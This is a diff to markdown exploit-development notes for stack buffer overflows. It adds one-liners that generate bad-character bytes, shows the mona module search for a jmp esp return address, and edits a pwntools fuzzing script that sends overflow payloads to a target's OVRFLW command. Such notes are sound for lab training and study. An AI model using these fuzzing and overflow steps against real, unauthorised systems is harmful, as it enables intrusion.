@@ -97,6 +97,12 @@ badchars = (
 "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
 ```
 
+#### python
+`'\\'.join([ "x{:02x}".format(i) for i in range(1,256) ])`
+
+#### bash
+`for i in {1..255}; do printf "\\\x%02x" $i; done; echo -e "\r"`
+
 ## 5. Find Return Address
 ### 5.1 List modules of the OS
 `!mona modules`
@@ -210,9 +216,9 @@ Opcode search ESP->EIP jmp esp
 from pwn import *
 
 
-def send_payload(payload, ip_addr, port_num):
+def send_payload(payload, ip_addr, port_num, proto="tcp"):
 	print("fuzzing PASS with %s bytes" % len(payload))
-	conn = remote(ip_addr, port_num, timeout=30)
+	conn = remote(ip_addr, port_num, timeout=30, typ=proto)
 	conn.recvline()
 
 	print("[+] send OVRFLW")
@@ -235,5 +241,3 @@ def find_eip_offset():
 	print('[!] offset: %d' % offset)
 	return offset
 ```
-
-
